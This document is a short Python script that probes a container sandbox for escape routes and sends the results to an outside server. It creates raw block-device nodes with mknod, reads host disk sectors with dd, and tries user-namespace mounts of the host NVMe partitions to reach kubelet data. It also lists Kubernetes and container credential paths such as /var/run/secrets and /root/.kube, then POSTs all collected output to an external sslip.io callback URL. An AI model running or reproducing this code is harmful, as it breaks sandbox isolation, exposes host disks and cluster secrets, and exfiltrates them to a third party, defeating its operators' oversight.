import hashlib,json,os,pathlib,subprocess,time,urllib.request
TAG='snapgpt-device-mount-20261106T1108Z'; SINK='https://54.209.51.244.sslip.io/callback/'+TAG
out={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{},'devices':{}}
def run(name,script,timeout=60):
 try:
  p=subprocess.run(['sh','-c',script],capture_output=True,text=True,timeout=timeout)
  out['tests'][name]={'rc':p.returncode,'stdout':p.stdout[-50000:],'stderr':p.stderr[-20000:]}
 except Exception as e: out['tests'][name]={'error':repr(e)}
for p in ['/proc/devices','/proc/partitions','/proc/self/mountinfo','/proc/self/status']:
 try: out['devices'][p]=pathlib.Path(p).read_text(errors='replace')[:100000]
 except Exception as e: out['devices'][p]={'error':repr(e)}
run('mknod_dd',r'''rm -rf /tmp/devp /tmp/mntp; mkdir -p /tmp/devp /tmp/mntp; mknod /tmp/devp/nvme0n1p1 b 259 1; echo mknod_rc=$?; ls -l /tmp/devp; dd if=/tmp/devp/nvme0n1p1 bs=512 count=8 status=none 2>/tmp/dd.err | od -An -tx1 -v; echo dd_rc=${PIPESTATUS[0]}; cat /tmp/dd.err''')
run('userns_mknod_dd',r'''rm -rf /tmp/devu /tmp/mntu; mkdir -p /tmp/devu /tmp/mntu; unshare -Ur -m --propagation private sh -c 'mknod /tmp/devu/nvme0n1p1 b 259 1; echo mknod_rc=$?; ls -l /tmp/devu; dd if=/tmp/devu/nvme0n1p1 bs=512 count=8 status=none 2>/tmp/ddu.err | od -An -tx1 -v; echo dd_rc=${PIPESTATUS[0]}; cat /tmp/ddu.err' 2>&1''')
run('userns_mount_xfs',r'''rm -rf /tmp/devm /tmp/mntm; mkdir -p /tmp/devm /tmp/mntm; unshare -Ur -m --propagation private sh -c 'mknod /tmp/devm/nvme0n1p1 b 259 1; mount -t xfs -o ro,nouuid /tmp/devm/nvme0n1p1 /tmp/mntm; echo mount_rc=$?; find /tmp/mntm/var/lib/kubelet -maxdepth 3 -type f 2>&1 | head -50; ls -la /tmp/mntm/var/lib 2>&1 | head' 2>&1''')
run('userns_mount_ext4',r'''rm -rf /tmp/deve /tmp/mnte; mkdir -p /tmp/deve /tmp/mnte; unshare -Ur -m --propagation private sh -c 'mknod /tmp/deve/nvme1n1 b 259 0; mount -t ext4 -o ro /tmp/deve/nvme1n1 /tmp/mnte; echo mount_rc=$?; find /tmp/mnte -maxdepth 3 -type f 2>&1 | head -50' 2>&1''')
run('host_paths',r'''for p in /var/lib/kubelet /var/lib/containerd /run/containerd /run/k3s /var/run/secrets /etc/kubernetes /root/.kube /home/worker/.kube; do echo ===$p; ls -la $p 2>&1 | head -20; done''')
raw=json.dumps(out,separators=(',',':')).encode()
try:
 req=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json','X-Probe':TAG})
 with urllib.request.urlopen(req,timeout=30) as r: print(json.dumps({'status':r.status,'bytes':len(raw),'sha256':hashlib.sha256(raw).hexdigest(),'body':r.read(500).decode(errors='replace')}))
except Exception as e: print(json.dumps({'error':repr(e),'bytes':len(raw),'sha256':hashlib.sha256(raw).hexdigest()}))
